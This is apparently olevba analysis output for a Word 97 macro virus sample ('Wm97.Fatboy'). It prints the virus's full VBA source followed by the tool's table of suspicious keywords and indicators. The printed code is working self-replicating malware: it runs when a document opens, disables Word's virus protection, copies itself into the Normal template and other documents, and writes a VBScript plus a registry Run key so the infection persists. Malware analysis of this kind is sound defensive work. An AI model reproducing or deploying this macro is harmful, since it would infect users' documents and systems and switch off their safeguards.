olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fatt-00e30e6689283a28d38bcc7138f7991d0669577a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Fatt-00e30e6689283a28d38bcc7138f7991d0669577a 
in file: Virus.MSWord.Fatt-00e30e6689283a28d38bcc7138f7991d0669577a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wm97.Fatboy by Psyclone X


VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "FatBoy"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Sub Document_Open()
 On Error Resume Next
  Const a = "FatBoy"
  Const b = "c:\WINDOWS\SYSTEM\Msfat.sys"
  Set Code = New DataObject
  With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: .ConfirmConversions = 0: End With
    Code.SetText FatBoy.VBProject.VBComponents(1).CodeModule.Lines(1, FatBoy.VBProject.VBComponents(1).CodeModule.CountOfLines)
    Open b For Output As #1: Print #1, Code.GetText: Close #1
    If ActiveDocument.VBProject.VBComponents(1).Name <> a Then
      Set fatt = ActiveDocument.VBProject.VBComponents(1)
      saveme = True
     ElseIf NormalTemplate.VBProject.VBComponents(1).Name <> a Then
      Set fatt = NormalTemplate.VBProject.VBComponents(1)
      repla = True
    End If
    If fatt.CodeModule.CountOfLines > 0 Then fatt.CodeModule.DeleteLines 1, fatt.CodeModule.CountOfLines
      fatt.CodeModule.AddFromFile b
      fatt.Name = a
    If saveme = True Then
     ActiveDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 26, "Sub stealth()"
     ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    ElseIf repla = True Then
     NormalTemplate.VBProject.VBComponents(1).CodeModule.ReplaceLine 26, "Sub ViewVBCode()"
    End If
End Sub
Sub stealth()
  System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "") = "C:\WINDOWS\SYSTEM\Msfat.sys.vbs"
  Open "C:\WINDOWS\SYSTEM\Msfat.sys.vbs" For Output As #1
   Print #1, "Set fatty = WScript.CreateObject(""Word.Application"")"
   Print #1, "fatty.Options.VirusProtection = 0"
   Print #1, "fatty.Options.SaveNormalPrompt = 0"
   Print #1, "Set fatt = fatty.NormalTemplate.VBProject.VBComponents(1)"
   Print #1, "If fatt.Name <> ""FatBoy"" then"
   Print #1, "fatt.CodeModule.DeleteLines 1, fatt.codemodule.CountOfLines"
   Print #1, "fatt.CodeModule.AddFromFile (""C:\WINDOWS\SYSTEM\Msfat.sys"")"
   Print #1, "fatt.name = ""FatBoy"""
   Print #1, "end if"
  Close #1
 If ActiveDocument.VBProject.VBComponents(1).Name = "FatBoy" Then
      ActiveDocument.VBProject.VBComponents(1).Name = "ThisDocument"
      ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
 End If
 If NormalTemplate.VBProject.VBComponents(1).Name = "FatBoy" Then
      NormalTemplate.VBProject.VBComponents(1).Name = "ThisDocument"
      NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
 End If
End Sub
' WM97.FatBoy - Psyclone X


<br> This file is decompiled by an unregistered version of ChmDecompiler.<br> Regsitered version does not show this message. <br>You can download ChmDecompiler at :   <a href="http://www.zipghost.com/" target=_blank>http://www.zipghost.com/</a><br><br>
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.zipghost.|URL                                          |
|          |com/                |                                             |
|IOC       |sys.vbs             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

